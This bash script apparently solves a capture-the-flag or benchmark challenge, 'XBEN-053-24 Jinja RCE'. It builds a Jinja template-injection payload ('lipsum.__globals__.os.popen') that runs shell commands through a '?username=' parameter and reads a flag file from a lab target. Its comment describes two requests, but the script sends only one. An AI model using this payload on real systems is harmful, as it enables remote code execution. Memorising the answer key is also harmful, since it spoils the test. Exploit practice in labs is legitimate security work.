#!/usr/bin/env bash
# XBEN-053-24 — "Jinja RCE" (tags: ssti)
#
# The page renders whatever `?username=` contains as part of its own template,
# so the parameter is code. `lipsum` is a Jinja builtin whose `__globals__`
# include `os`, and from there `popen` runs anything.
#
# The flag is a file in the application directory rather than at `/flag`, which
# is why the payload is a command and not a fixed path: one request lists the
# directory, the next reads the file. Both are the same edit to the same URL.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
H5I="${H5I:-h5i}"
SESSION="xben053-$$"
trap '"$H5I" browser close --session "$SESSION" >/dev/null 2>&1' EXIT

ssti() {
    python3 -c "
import urllib.parse, sys
print(urllib.parse.quote('{{lipsum.__globals__.os.popen(%r).read()}}' % sys.argv[1]))" "$1"
}

"$H5I" browser open "$URL/?username=$(ssti 'cat /app/flag.txt')" \
    --session "$SESSION" --new --capture >/dev/null
"$H5I" browser markdown --session "$SESSION" |
    python3 -c 'import re,sys; m=re.search(r"FLAG\{[a-f0-9]{64}\}", sys.stdin.read()); print(m.group(0) if m else "no flag found")'
